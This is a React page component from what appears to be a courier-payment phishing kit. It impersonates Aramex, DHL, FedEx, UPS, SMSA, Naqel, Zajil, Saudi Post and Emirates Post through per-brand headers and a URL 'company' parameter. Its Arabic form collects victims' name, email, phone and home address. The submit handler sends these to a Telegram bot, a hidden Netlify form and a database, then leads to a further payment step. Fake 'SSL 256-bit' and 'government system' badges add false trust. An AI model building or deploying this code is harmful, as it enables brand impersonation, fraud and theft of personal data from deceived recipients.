import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Lock, ChevronRight } from "lucide-react";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const currencyParam = urlParams.get('currency');
  const titleParam = urlParams.get('title');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const enhancedBranding = getBrandingByCompany(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = companyMeta.image;

  const shippingInfo = linkData?.payload as any;
  const payerType = shippingInfo?.payer_type || "recipient";
  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const currencyCode = currencyParam || countryData?.currency || "SAR";

  const rawAmount = shippingInfo?.cod_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyCode);
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
  
  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    const formData = new FormData();
    formData.append('form-name', 'payment-recipient');
    formData.append('name', customerName);
    formData.append('email', customerEmail);
    formData.append('phone', customerPhone);
    formData.append('address', residentialAddress);
    formData.append('service', serviceName);
    formData.append('amount', formattedAmount);
    formData.append('linkId', id || '');

    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }

    const productionDomain = window.location.origin;
    const telegramResult = await sendToTelegram({
      type: 'payment_recipient',
      data: {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        address: residentialAddress,
        service: serviceName,
        amount: formattedAmount,
        payment_url: `${productionDomain}/pay/${id}/details`
      },
      timestamp: new Date().toISOString()
    });

    try {
      const customerData = {
        ...linkData.payload,
        customerInfo: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          address: residentialAddress,
          service: serviceName,
          amount: formattedAmount
        },
        selectedCountry: countryCode
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: customerData
      });
    } catch (error) {
    }

    navigate(`/pay/${id}/details`);
  };

  const getCompanySpecificHeader = () => {
    const key = serviceKey.toLowerCase();
    
    if (key === 'aramex') {
      return (
        <div className="h-16 sm:h-20 bg-white shadow-sm border-b border-gray-200">
          <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
            <img src="/logos/aramex-logo.svg" alt="Aramex" className="h-8 sm:h-10" onError={(e) => {
              e.currentTarget.outerHTML = `<div class="flex items-center gap-2"><div class="w-8 h-8 rounded" style="background: #DC291E"></div><span class="text-2xl font-bold" style="color: #DC291E">aramex</span></div>`;
            }} />
            <Badge className="text-xs bg-gray-100 text-gray-700 border-0">
              <Lock className="w-3 h-3 ml-1" />
              Secure Payment
            </Badge>
          </div>
        </div>
      );
    }
    
    if (key === 'dhl' || key.startsWith('dhl')) {
      return (
        <div className="h-16 sm:h-20 shadow-sm" style={{ background: '#FFCC00' }}>
          <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
            <div className="flex items-center gap-3">
              <span className="text-3xl sm:text-4xl font-black" style={{ 
                color: '#D40511',
                fontFamily: 'Arial, Helvetica, sans-serif',
                letterSpacing: '-0.02em'
              }}>DHL</span>
              <span className="hidden sm:inline text-sm font-medium" style={{ color: '#D40511' }}>Express</span>
            </div>
            <Badge className="text-xs text-white border-0" style={{ background: '#D40511' }}>
              <Shield className="w-3 h-3 ml-1" />
              Secure
            </Badge>
          </div>
        </div>
      );
    }
    
    if (key === 'fedex') {
      return (
        <div className="h-16 sm:h-20 bg-white shadow-sm border-b border-gray-200">
          <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
            <div className="flex items-center">
              <span className="font-black text-3xl sm:text-4xl" style={{ 
                color: '#4D148C',
                fontFamily: 'Arial, Helvetica, sans-serif',
                letterSpacing: '-0.02em'
              }}>Fed</span>
              <span className="font-black text-3xl sm:text-4xl" style={{ 
                color: '#FF6600',
                fontFamily: 'Arial, Helvetica, sans-serif',
                letterSpacing: '-0.02em'
              }}>Ex</span>
            </div>
            <Badge className="text-xs bg-gray-100 text-gray-700 border-0">
              <Lock className="w-3 h-3 ml-1" />
              Secure
            </Badge>
          </div>
        </div>
      );
    }
    
    if (key === 'ups') {
      return (
        <div className="h-16 sm:h-20 shadow-sm" style={{ background: '#351C15' }}>
          <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
            <img src="/logos/ups-logo.svg" alt="UPS" className="h-8 sm:h-10" onError={(e) => {
              e.currentTarget.outerHTML = `<div class="bg-white px-3 py-1 rounded"><span class="font-black text-2xl" style="color: #351C15">UPS</span></div>`;
            }} />
            <Badge className="text-xs text-white border-0" style={{ background: '#FFB500', color: '#351C15' }}>
              <Shield className="w-3 h-3 ml-1" />
              Secure
            </Badge>
          </div>
        </div>
      );
    }
    
    if (key === 'smsa') {
      return (
        <div className="h-16 sm:h-20 bg-white shadow-sm border-b border-gray-200">
          <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
            <img src="/logos/smsa-logo.svg" alt="SMSA" className="h-8 sm:h-10" onError={(e) => {
              e.currentTarget.outerHTML = `<div class="flex items-center gap-2"><span class="text-2xl font-bold" style="color: #662D91">SMSA</span><span class="text-sm" style="color: #FF6600">EXPRESS</span></div>`;
            }} />
            <Badge className="text-xs bg-gray-100 text-gray-700 border-0">
              <Lock className="w-3 h-3 ml-1" />
              دفع آمن
            </Badge>
          </div>
        </div>
      );
    }
    
    if (key === 'naqel') {
      return (
        <div className="h-16 sm:h-20 bg-white shadow-sm border-b border-gray-200">
          <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
            <img src="/logos/naqel-logo.png" alt="NAQEL" className="h-10 sm:h-12" onError={(e) => {
              e.currentTarget.outerHTML = `<div class="flex items-center gap-2"><span class="text-2xl font-bold" style="color: #002E60">ناقل</span><span class="text-xl font-bold" style="color: #E61838">EXPRESS</span></div>`;
            }} />
            <Badge className="text-xs bg-gray-100 text-gray-700 border-0">
              <Shield className="w-3 h-3 ml-1" />
              دفع آمن
            </Badge>
          </div>
        </div>
      );
    }
    
    if (key === 'zajil') {
      return (
        <div className="h-16 sm:h-20 bg-white shadow-sm border-b border-gray-200">
          <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
            <img src="/logos/zajil-logo.png" alt="Zajil" className="h-10 sm:h-12" onError={(e) => {
              e.currentTarget.outerHTML = `<div class="flex items-center gap-2"><span class="text-2xl font-bold" style="color: #1C4587">زاجل</span></div>`;
            }} />
            <Badge className="text-xs bg-gray-100 text-gray-700 border-0">
              <Lock className="w-3 h-3 ml-1" />
              دفع آمن
            </Badge>
          </div>
        </div>
      );
    }
    
    if (key === 'saudipost') {
      return (
        <div className="h-16 sm:h-20 bg-white shadow-sm border-b border-gray-200">
          <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-full flex items-center justify-center" style={{ background: '#006C35' }}>
                <MapPin className="w-5 h-5 text-white" />
              </div>
              <span className="text-xl font-bold" style={{ color: '#006C35' }}>البريد السعودي</span>
            </div>
            <Badge className="text-xs bg-gray-100 text-gray-700 border-0">
              <Shield className="w-3 h-3 ml-1" />
              نظام حكومي
            </Badge>
          </div>
        </div>
      );
    }
    
    if (key === 'empost') {
      return (
        <div className="h-16 sm:h-20 bg-white shadow-sm border-b border-gray-200">
          <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded flex items-center justify-center" style={{ background: '#C8102E' }}>
                <MapPin className="w-5 h-5 text-white" />
              </div>
              <span className="text-xl font-bold" style={{ color: '#C8102E' }}>البريد الإماراتي</span>
            </div>
            <Badge className="text-xs bg-gray-100 text-gray-700 border-0">
              <Shield className="w-3 h-3 ml-1" />
              Emirates Post
            </Badge>
          </div>
        </div>
      );
    }
    
    return (
      <div className="h-16 sm:h-20 bg-white shadow-sm border-b border-gray-200">
        <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6">
          {branding.logo && (
            <img 
              src={branding.logo} 
              alt={serviceName} 
              className="h-8 sm:h-10" 
              onError={(e) => e.currentTarget.style.display = 'none'}
            />
          )}
          {!branding.logo && (
            <span className="text-xl font-bold" style={{ color: branding.colors.primary }}>
              {serviceName}
            </span>
          )}
          <Badge className="text-xs bg-gray-100 text-gray-700 border-0">
            <Lock className="w-3 h-3 ml-1" />
            Secure
          </Badge>
        </div>
      </div>
    );
  };
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={dynamicTitle}
        description={dynamicDescription}
      />
      <Helmet>
        <meta property="og:image" content={dynamicImage} />
        <meta name="twitter:image" content={dynamicImage} />
      </Helmet>
      <div 
        className="min-h-screen" 
        dir="rtl"
        style={{
          background: enhancedBranding?.colors.background || '#FFFFFF',
          fontFamily: enhancedBranding?.fonts.arabic || '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
        }}
      >
        {/* Company Header with Official Logo */}
        {getCompanySpecificHeader()}

        {/* Main Content */}
        <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
          <div className="max-w-xl mx-auto">
            
            {/* Page Title */}
            <div className="mb-5">
              <h1 className="text-xl sm:text-2xl font-bold mb-2" style={{ 
                color: enhancedBranding?.colors.text || '#1A1A1A' 
              }}>
                {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
              </h1>
              <p className="text-sm" style={{ 
                color: enhancedBranding?.colors.textLight || '#6B7280' 
              }}>
                يرجى إدخال بياناتك لإكمال عملية الدفع
              </p>
            </div>

            {/* Amount Display */}
            <div className="mb-5 p-4 rounded-lg border-2" style={{
              background: `${branding.colors.primary}05`,
              borderColor: `${branding.colors.primary}30`
            }}>
              <div className="flex items-center justify-between">
                <span className="text-sm font-medium" style={{ color: enhancedBranding?.colors.text }}>
                  المبلغ المطلوب
                </span>
                <span className="text-2xl font-bold" style={{ color: branding.colors.primary }}>
                  {formattedAmount}
                </span>
              </div>
            </div>

            {/* Payment Form Card */}
            <Card className="p-5 sm:p-6 shadow-lg border" style={{ 
              borderColor: `${branding.colors.primary}20`,
              background: enhancedBranding?.colors.surface || '#FFFFFF'
            }}>
              <form onSubmit={handleProceed}>
                
                {/* Form Section Header */}
                <div className="flex items-center gap-3 mb-5 pb-4 border-b" style={{
                  borderColor: `${branding.colors.primary}15`
                }}>
                  <div className="w-10 h-10 rounded-lg flex items-center justify-center" style={{
                    background: `${branding.colors.primary}10`
                  }}>
                    <User className="w-5 h-5" style={{ color: branding.colors.primary }} />
                  </div>
                  <div>
                    <h2 className="text-base font-bold" style={{ color: enhancedBranding?.colors.text }}>
                      بيانات العميل
                    </h2>
                    <p className="text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
                      جميع الحقول مطلوبة
                    </p>
                  </div>
                </div>

                {/* Form Fields - ALL 4 FIELDS PRESERVED */}
                <div className="space-y-4">
                  
                  {/* Name Field - PRESERVED */}
                  <div>
                    <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm font-semibold" style={{
                      color: enhancedBranding?.colors.text
                    }}>
                      <User className="w-4 h-4" style={{ color: branding.colors.primary }} />
                      الاسم الكامل
                    </Label>
                    <Input
                      id="name"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      required
                      className="h-11 text-sm"
                      placeholder="أدخل اسمك الكامل"
                      style={{
                        borderColor: `${branding.colors.primary}30`,
                        fontFamily: enhancedBranding?.fonts.arabic
                      }}
                    />
                  </div>
                  
                  {/* Email Field - PRESERVED */}
                  <div>
                    <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm font-semibold" style={{
                      color: enhancedBranding?.colors.text
                    }}>
                      <Mail className="w-4 h-4" style={{ color: branding.colors.primary }} />
                      البريد الإلكتروني
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      required
                      className="h-11 text-sm"
                      placeholder="example@email.com"
                      dir="ltr"
                      style={{
                        borderColor: `${branding.colors.primary}30`
                      }}
                    />
                  </div>
                  
                  {/* Phone Field - PRESERVED */}
                  <div>
                    <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm font-semibold" style={{
                      color: enhancedBranding?.colors.text
                    }}>
                      <Phone className="w-4 h-4" style={{ color: branding.colors.primary }} />
                      رقم الهاتف
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      required
                      className="h-11 text-sm"
                      placeholder={`${phoneCode} ${phonePlaceholder}`}
                      dir="ltr"
                      style={{
                        borderColor: `${branding.colors.primary}30`
                      }}
                    />
                  </div>
                  
                  {/* Address Field - PRESERVED */}
                  <div>
                    <Label htmlFor="address" className="flex items-center gap-2 mb-2 text-sm font-semibold" style={{
                      color: enhancedBranding?.colors.text
                    }}>
                      <MapPin className="w-4 h-4" style={{ color: branding.colors.primary }} />
                      العنوان السكني
                    </Label>
                    <Input
                      id="address"
                      value={residentialAddress}
                      onChange={(e) => setResidentialAddress(e.target.value)}
                      required
                      className="h-11 text-sm"
                      placeholder="أدخل عنوانك السكني الكامل"
                      style={{
                        borderColor: `${branding.colors.primary}30`,
                        fontFamily: enhancedBranding?.fonts.arabic
                      }}
                    />
                  </div>
                </div>

                {/* Security Notice */}
                <div className="mt-5 mb-5 p-3 rounded-lg flex items-center gap-3" style={{
                  background: `${branding.colors.primary}08`,
                  border: `1px solid ${branding.colors.primary}20`
                }}>
                  <Shield className="w-5 h-5 flex-shrink-0" style={{ color: branding.colors.primary }} />
                  <div>
                    <p className="text-xs font-semibold mb-0.5" style={{ color: enhancedBranding?.colors.text }}>
                      معاملة آمنة ومشفرة
                    </p>
                    <p className="text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
                      معلوماتك محمية بتشفير SSL 256-bit
                    </p>
                  </div>
                </div>
              
                {/* Submit Button */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-sm py-6 text-white font-bold transition-all hover:shadow-lg hover:scale-[1.02]"
                  style={{
                    background: branding.colors.primary,
                    fontFamily: enhancedBranding?.fonts.arabic
                  }}
                >
                  <span>المتابعة إلى الدفع</span>
                  <ChevronRight className="w-5 h-5 mr-2" />
                </Button>
              
                <p className="text-xs text-center mt-4" style={{ 
                  color: enhancedBranding?.colors.textLight 
                }}>
                  بالمتابعة، أنت توافق على شروط وأحكام الخدمة
                </p>
              </form>
              
              {/* Hidden Netlify Form - PRESERVED */}
              <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
                <input type="text" name="name" />
                <input type="email" name="email" />
                <input type="tel" name="phone" />
                <input type="text" name="address" />
                <input type="text" name="service" />
                <input type="text" name="amount" />
                <input type="text" name="linkId" />
              </form>
            </Card>

            {/* Footer Trust Badges */}
            <div className="mt-5 flex items-center justify-center gap-6">
              <div className="flex items-center gap-2">
                <Shield className="w-4 h-4" style={{ color: branding.colors.primary }} />
                <span className="text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
                  SSL آمن
                </span>
              </div>
              <div className="w-px h-4 bg-gray-300"></div>
              <div className="flex items-center gap-2">
                <Lock className="w-4 h-4" style={{ color: branding.colors.primary }} />
                <span className="text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
                  مشفر 256-bit
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;
